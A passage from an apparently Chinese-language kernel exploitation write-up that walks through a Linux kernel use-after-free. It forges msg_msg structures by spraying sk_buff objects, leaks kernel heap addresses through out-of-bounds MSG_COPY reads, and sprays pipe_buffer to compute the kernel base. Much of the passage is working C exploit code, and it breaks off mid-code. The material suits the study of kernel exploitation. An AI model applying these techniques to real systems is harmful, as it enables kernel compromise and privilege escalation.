<span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在内存视图如下：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927131724537.png" alt="image-20220927131724537"></p><ol start="3"><li>接下来我们进行第二次释放，释放掉kheap：</li></ol><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927131747073.png" alt="image-20220927131747073"></p><ol start="4"><li>然后构造假的msg_msg结构体，将<code>m_ts</code>成员设置为0x400，使用sk_buff堆喷占用kheap，那么我就可以修改原本的msg_msg结构。这里注意一下sk_buff的大小，由于sk_buff自带320字节的内容，所以我们要构造1024的话，消息内容就是1024-320&#x3D;704字节。</li></ol><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927131822597.png" alt="image-20220927131822597"></p><ol start="5"><li>然后我们释放掉所有申请的sk_buff，其主要目的是使kheap进入free list，方便后续我们再次申请回来进行写入。这部分代码如下：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SK_BUFF_NUM</span> <span class="token expression"><span class="token number">128</span></span></span><span class="token keyword">char</span> fake_secondary_msg<span class="token punctuation">[</span><span class="token number">704</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 构造msg_msg结构，向参数1结构体赋值</span><span class="token keyword">void</span> <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_list_next<span class="token punctuation">,</span>    <span class="token class-name">uint64_t</span> m_list_prev<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_type<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">,</span>     <span class="token class-name">uint64_t</span> next<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> security<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> m_list_next<span class="token punctuation">;</span>    msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> m_list_prev<span class="token punctuation">;</span>    msg<span class="token operator">-></span>m_type <span class="token operator">=</span> m_type<span class="token punctuation">;</span>    msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> m_ts<span class="token punctuation">;</span>    msg<span class="token operator">-></span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>    msg<span class="token operator">-></span>security <span class="token operator">=</span> security<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// msgrcv接受消息，加上MSG_COPY标志的话，读取过的内核数据区不会被unlink</span><span class="token keyword">int</span> <span class="token function">peekMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgtyp<span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 释放sk_buff结构，向socketpair读来达到释放的目的</span><span class="token keyword">int</span> <span class="token function">freeSkBuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> sk_socket<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sk_socket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 喷射sk_buff结构，他附带一个skb_shared_info结构体。向socketpair写来达到分配的目的，喷射大小为0x400，每个socketpair喷射128次</span><span class="token keyword">int</span> <span class="token function">spraySkBuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> sk_socket<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token comment">// printf("[-] now %d, num %d\n", i, j);</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>sk_socket<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span>         victim_qid<span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 喷射sk_buff，使用sk_buff占用这个被释放的0x400堆块，并写入一个构造好的msg_msg结构</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] spray sk_buff..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> SECONDARY_MSG_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用msgrcv来读取所有的msg队列中的内容，并添加MSG_COPY标识位，避免unlink时错误的链表指针导致内核崩溃</span>    victim_qid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 由于我们修改过msg_msg结构体，所以它无法被读取出来，利用这一点可以判断出我们命中队列的下标</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] victim qid: %d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            victim_qid <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>victim_qid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to make the UAF in msg queue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 然后释放掉sk_buff</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>我们再次把kheap分配回来，为了提高分配成功率，还是使用堆喷sk_buff的方式。这次我们要修改掉msg_msg的<code>m_ts</code>成员为0x1000，很明显，在操作msg_msg结构时会发生越界访问，因为原来的<code>msg_msg -&gt;m_ts</code>是0x400，被我们改为了0x1000。</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VICTIM_MSG_TYPE</span>     <span class="token expression"><span class="token number">0x1337</span></span></span><span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>             <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span>             VICTIM_MSG_TYPE<span class="token punctuation">,</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927131952560.png" alt="image-20220927131952560"></p><ol start="7"><li>改完<code>m_ts</code>后就可以读取内核数据到用户态了，会发生越界访问。那么只要判断我们标记的tag，就可以知道是否命中UAF的堆块，这时候直接在oob_msg中查找我们想要的数据即可。代码如下：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span>  <span class="token operator">*</span>nearby_msg<span class="token punctuation">;</span><span class="token keyword">struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span><span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> oob_msg<span class="token punctuation">;</span><span class="token comment">// oob_msg读取的数据会保存到oob_msg</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to read victim msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to rehit the UAF object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>nearby_msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token operator">*</span><span class="token punctuation">)</span>             <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token punctuation">(</span>SECONDARY_MSG_SIZE<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n"</span><span class="token punctuation">,</span>             nearby_msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>现在有了这个内核堆地址，其实也就是msg_msg中的链表地址，那么我们就可以再次释放，然后去伪造一个msg_msg结构体，伪造一个超出0x1000大小的结构，构造<code>m_ts</code>成员和<code>next</code>成员，<code>next</code>指针指向第二部分消息内容。</li></ol><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927132052584.png" alt="image-20220927132052584"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>           <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>           <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"unr4v31."</span><span class="token punctuation">,</span>           VICTIM_MSG_TYPE<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">)</span><span class="token punctuation">,</span>           nearby_msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>           <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peekMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>oob_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to read victim msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to rehit the UAF object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// cal the addr of UAF obj by the header we just read out</span>  nearby_msg_prim <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token operator">*</span><span class="token punctuation">)</span>           <span class="token operator">&amp;</span>oob_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  victim_addr <span class="token operator">=</span> nearby_msg_prim<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">-</span> <span class="token number">0x400</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n"</span><span class="token punctuation">,</span>           nearby_msg_prim<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n"</span><span class="token punctuation">,</span> victim_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="9"><li>下面开始修复msg_msg结构体，使它链到我们指定的堆块上，并修复<code>m_ts</code>大小为0x400，然后释放掉msg_msg结构体，但我们仍然可以通过sk_buff来对它进行操作。</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">freeSkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>           <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">buildMsg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_secondary_msg<span class="token punctuation">,</span>           victim_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">,</span> victim_addr <span class="token operator">+</span> <span class="token number">0x800</span><span class="token punctuation">,</span> <span class="token comment">// a valid kheap addr is valid</span>          VICTIM_MSG_TYPE<span class="token punctuation">,</span> SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span>           <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>           <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 释放msg_msg结构</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>victim_qid<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span>               <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> VICTIM_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to receive secondary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="10"><li>之后喷射pipe_buffer结构体，命中kheap之后，再用把sk_buff读出来，就得到了pipe_buffer结构体的内容，可以根据<code>pipe_buffer -&gt; ops</code>成员算出内核基址：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PIPE_NUM</span> <span class="token expression"><span class="token number">256</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ANON_PIPE_BUF_OPS</span> <span class="token expression"><span class="token number">0xffffffff8203fe40</span></span></span><span class="token comment">// pipe_buffer 结构体照着源码搬运过来</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    page<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span>    offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    ops<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span>    flags<span class="token punctuation">;</span>    <span 